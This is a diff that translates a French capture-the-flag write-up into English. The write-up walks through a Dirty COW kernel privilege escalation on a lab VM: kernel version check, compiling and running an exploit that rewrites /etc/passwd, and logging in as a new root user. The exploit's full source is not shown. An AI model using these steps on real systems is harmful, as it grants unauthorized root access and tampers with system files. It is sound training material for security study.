@@ -1,17 +1,18 @@
 # Dirtycow
 
-On cherche à savoir sur quelle version de **Kernel** on est :
+We are trying to find out which version of **Kernel** we are on:
 <pre><code>> uname -a
 Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UTC 2015 i686 athlon i386 GNU/Linux
 </code></pre>
 
-On cherche sur *https://www.exploit-db.com* un exploit valable pour notre version de **Kernel**.
+On *https://www.exploit-db.com* we are looking for a valid exploit for our version of **Kernel**.
 
-On trouve un exploit nommé **dirtycow** qui est basé sur une **race-condition-vulnerabilty** :
+We find an exploit named **dirtycow** which is based on a **race-condition-vulnerabilty** :
 
 <pre>Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)</pre>
 
-On se connecte en **ssh** à n'importe quel user (zaz ici), et on créé le fichier **dirty.c** : 
+We connect in **ssh** to any user (zaz here), and create the file **dirty.c** : 
+
 <pre><code>//
 // This exploit uses the pokemon exploit of the dirtycow vulnerability
 // as a base and automatically generates a new passwd line.
@@ -207,7 +208,7 @@ int main(int argc, char *argv[])
 }
 </code></pre>
 
-On compile et éxecute :
+We compile and execute :
 <pre><code>> gcc -pthread dirty.c -o dirty -lcrypt
 > ./dirty test
 /etc/passwd successfully backed up to /tmp/passwd.bak
@@ -232,7 +233,7 @@ DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
 
 </code></pre>
 
-On se connecte au nouvel user avec les ids :
+We connect to the new user with the ids:
 
 <code>firefart</code>
 <code>test</code>
@@ -242,7 +243,7 @@ Password:
 firefart@BornToSecHackMe:/home/zaz#
 </code></pre>
 
-Nous obtenons un terminal avec les droits **root** :
+We get a terminal with the **root** rights:
 <pre><code>> id
 uid=0(firefart) gid=0(root) groups=0(root)
 </code></pre>
